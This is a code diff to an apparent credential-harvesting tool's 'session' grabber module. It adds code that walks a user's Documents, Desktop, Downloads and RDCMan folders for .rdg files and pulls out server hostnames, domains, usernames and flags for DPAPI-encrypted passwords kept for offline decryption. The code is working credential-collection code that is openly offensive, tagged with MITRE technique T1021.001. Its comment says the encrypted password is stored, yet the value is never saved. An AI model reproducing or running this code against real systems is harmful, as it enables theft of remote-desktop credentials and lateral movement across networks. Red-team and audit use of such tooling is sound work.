@@ -14,6 +14,7 @@ from __future__ import annotations
 
 import os
 import re
+import xml.etree.ElementTree as ET
 
 from ._registry import enum_reg_subkeys, read_reg_value
 from .base import GrabberContext, GrabberModule
@@ -23,7 +24,7 @@ from .utils import safe_read_text
 
 class SessionGrabber(GrabberModule):
     name = "session"
-    description = "Extract RDP connection history and remote session data"
+    description = "Extract RDP history, .rdp files, RDCMan .rdg server inventories"
     min_privilege = PrivilegeLevel.USER
     supported_platforms = ("Windows", "Darwin", "Linux")
     default_enabled = True
@@ -43,6 +44,18 @@ class SessionGrabber(GrabberModule):
         # .rdp files in common locations
         rdp_files = self._find_rdp_files(context)
         result.credentials.extend(rdp_files)
+
+        # RDCMan .rdg files (server inventories with saved credentials)
+        rdg_creds = self._find_rdg_files(context)
+        result.credentials.extend(rdg_creds)
+        if rdg_creds:
+            result.findings.append(self.make_finding(
+                file_path="RDCMan",
+                description=f"RDCMan: {len(rdg_creds)} server(s) with saved credentials",
+                score=150 * min(len(rdg_creds), 3),
+                matched_value="RDCMan .rdg",
+                snippets=[f"{c.url} ({c.username})" for c in rdg_creds[:5]],
+            ))
 
         if result.credentials:
             result.findings.append(self.make_finding(
@@ -158,3 +171,97 @@ class SessionGrabber(GrabberModule):
                 mitre_technique="T1021.001",
             )
         return None
+
+    def _find_rdg_files(self, context: GrabberContext) -> list[ExtractedCredential]:
+        """Find and parse RDCMan .rdg files (server inventories with creds)."""
+        creds = []
+        search_dirs = [
+            os.path.join(context.user_profile_path, "Documents"),
+            os.path.join(context.user_profile_path, "Desktop"),
+            os.path.join(context.user_profile_path, "Downloads"),
+            os.path.join(context.appdata_local or "", "Microsoft", "Remote Desktop Connection Manager"),
+        ]
+
+        for search_dir in search_dirs:
+            if not os.path.isdir(search_dir):
+                continue
+            try:
+                for root, dirs, files in os.walk(search_dir):
+                    for fname in files:
+                        if fname.lower().endswith(".rdg"):
+                            fpath = os.path.join(root, fname)
+                            rdg_creds = self._parse_rdg_file(fpath)
+                            creds.extend(rdg_creds)
+                    if root.count(os.sep) - search_dir.count(os.sep) > 3:
+                        dirs.clear()
+            except (PermissionError, OSError):
+                continue
+
+        return creds
+
+    def _parse_rdg_file(self, path: str) -> list[ExtractedCredential]:
+        """Parse RDCMan .rdg XML for server connections with credentials.
+
+        RDCMan files contain server groups with individual server entries.
+        Each server can have a <logonCredentials> element with username,
+        domain, and DPAPI-encrypted password.
+        """
+        creds = []
+        content = safe_read_text(path)
+        if not content:
+            return creds
+
+        try:
+            root = ET.fromstring(content)
+        except ET.ParseError:
+            return creds
+
+        # Search for server entries
+        for server in root.iter("server"):
+            display_name = ""
+            hostname = ""
+            username = ""
+            domain = ""
+            has_password = False
+
+            name_elem = server.find("properties/name")
+            if name_elem is not None and name_elem.text:
+                hostname = name_elem.text.strip()
+
+            display_elem = server.find("properties/displayName")
+            if display_elem is not None and display_elem.text:
+                display_name = display_elem.text.strip()
+
+            # Check for logon credentials
+            logon = server.find("logonCredentials")
+            if logon is None:
+                logon = server.find("properties/logonCredentials")
+
+            if logon is not None:
+                user_elem = logon.find("userName")
+                domain_elem = logon.find("domain")
+                pass_elem = logon.find("password")
+
+                if user_elem is not None and user_elem.text:
+                    username = user_elem.text.strip()
+                if domain_elem is not None and domain_elem.text:
+                    domain = domain_elem.text.strip()
+                if pass_elem is not None and pass_elem.text:
+                    has_password = True
+                    # Password is DPAPI-encrypted, store for offline decrypt
+                    encrypted_b64 = pass_elem.text.strip()
+
+            if hostname:
+                full_user = f"{domain}\\{username}" if domain and username else username
+                creds.append(ExtractedCredential(
+                    source_module="session",
+                    credential_type="password" if has_password else "token",
+                    target_application="RDCMan",
+                    url=hostname,
+                    username=full_user,
+                    notes=f"rdg={os.path.basename(path)}" + (f"; display={display_name}" if display_name else "") + (" (has encrypted password)" if has_password else ""),
+                    mitre_technique="T1021.001",
+                    source_file=path,
+                ))
+
+        return creds
